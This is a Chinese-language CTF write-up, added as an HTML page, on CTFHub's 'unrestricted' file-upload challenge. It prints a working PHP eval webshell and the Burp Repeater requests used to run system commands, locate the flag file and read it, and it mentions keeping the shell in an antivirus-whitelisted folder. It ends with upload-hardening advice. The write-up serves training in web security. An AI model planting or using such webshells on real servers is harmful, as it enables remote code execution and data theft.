@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-无限制 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href=" ">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-无限制 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.19 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, 文件上传, 无限制, BurpSuite</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - 文件上传 / 无限制</li>
+        <li><strong>题目名称：</strong>无限制</li>
+        <li><strong>提示：</strong>服务器未对上传的文件做任何过滤，直接上传木马即可</li>
+    </ul>
+
+    <h2>2. 解题思路</h2>
+    <p>本题是文件上传漏洞中最基础、最简单的场景。服务器没有前端校验、没有 MIME 类型校验、没有文件头校验、没有后缀黑名单/白名单。我们只需要直接上传一个纯正的 PHP 一句话木马 <code>shell.php</code>，然后通过 Burp Suite 执行系统命令即可获取 Flag。</p >
+
+    <h2>3. 操作步骤</h2>
+    
+    <p><strong>第一步：构建纯正木马</strong></p >
+    <p>因为之前通关的木马文件已被清理，我们需要在本地重新创建一个不带任何伪装的纯正木马。</p >
+    <ul>
+        <li>在 VS Code 中新建文件，写入：<code>&lt;?php @eval($_POST['cmd']); ?&gt;</code>。</li>
+        <li>保存到 <code>muma</code> 文件夹（杀软白名单目录），命名为 <code>shell.php</code>。</li>
+    </ul>
+
+    <p><strong>第二步：直接上传</strong></p >
+    <ol>
+        <li>开启“无限制”靶场，确保 Burp 拦截开启。</li>
+        <li>在 BP 浏览器中选择 <code>shell.php</code> 并提交。</li>
+        <li>BP 拦截请求后，<strong>无需修改任何参数</strong>，直接点击 <code>Forward</code> 放行。</li>
+        <li>网页提示“上传成功”，路径为 <code>upload/shell.php</code>。</li>
+    </ol>
+
+    <p><strong>第三步：Repeater 连马（手动改包）</strong></p >
+    <p>按照惯例，将请求发送至 <code>Repeater</code>：</p >
+    <ol>
+        <li>修改第一行为：<code>POST /upload/shell.php HTTP/1.1</code>。</li>
+        <li>修改 <code>Content-Type</code> 为 <code>application/x-www-form-urlencoded</code>。</li>
+        <li>彻底清空下方所有 <code>------WebKitFormBoundary...</code> 内容，写入：<code>cmd=system("ls /");</code>。</li>
+        <li>修改第3行 <code>Content-Length: 19</code>，保留空行，点击 <code>Send</code>。成功回显根目录列表。</li>
+    </ol>
+
+    <p><strong>第四步：搜索并读取 Flag</strong></p >
+    <ol>
+        <li>将请求体替换为：<code>cmd=system("find / -name flag* 2>/dev/null");</code>。手动计算长度，该命令长度为 <strong>45</strong>，修改 <code>Content-Length: 45</code>。点击 <code>Send</code>。</li>
+        <li>结果回显路径：<code>/var/www/html/flag_1946812299.php</code>。</li>
+        <li><strong>读取 Flag（踩坑与修正）：</strong><br>
+        首次尝试使用 <code>print_r(file_get_contents('...'))</code> 时，手误将函数名写成了 <code>print_r9</code>，导致服务器返回 <code>syntax error</code>。修正为正确的 PHP 原生函数：<br>
+        <code>cmd=print_r(file_get_contents('/var/www/html/flag_1946812299.php'));</code><br>
+        代码总长度为 <strong>68</strong>，修改 <code>Content-Length: 68</code>，点击 <code>Send</code>。</li>
+        <li>右侧成功回显 Flag：<code>ctfhub{0d0169bd5153e9d75ef1fed6}</code></li>
+    </ol>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>无验证环境的直接性：</strong>在没有 WAF、没有过滤的靶场中，上传 <code>shell.php</code> 就是最直接的攻击方式。虽然简单，但这说明在真实的安全防御中，任何环节的缺失都会导致服务器被直接 RCE（远程代码执行）。</li>
+        <li><strong>HTTP 协议的肌肉记忆：</strong>即便是在最简单的环境下，修改 POST 包时仍需准确处理 <code>Content-Length</code> 和空行。这已经成为了每次操作的标准流程。</li>
+        <li><strong>原生函数的可靠性：</strong>再次验证了 <code>print_r(file_get_contents(...))</code> 在读取文件时的高效性与稳定性。这是在多次踩坑后固化下来的最佳实践。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>“无限制”漏洞原理：</strong>服务器未对用户上传的文件进行任何有效校验。攻击者可以直接上传 Webshell，并利用其执行系统命令、读取敏感文件，从而获取服务器权限。</li>
+        <li><strong>CTF 靶场中的评分策略：</strong>此类题目虽然简单，但在实战中通常作为“送分题”或“起手式”，用于快速验证漏洞是否存在。</li>
+        <li><strong>安全防御建议：</strong>严禁上线无验证的文件上传功能。必须严格执行后缀白名单校验、MIME 校验、文件内容检测（如 <code>getimagesize</code>），并将上传目录设置为不可执行脚本（例如在 Nginx 中配置 <code>location /uploads { deny all; }</code> 或 <code>php_admin_flag engine off</code>）。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
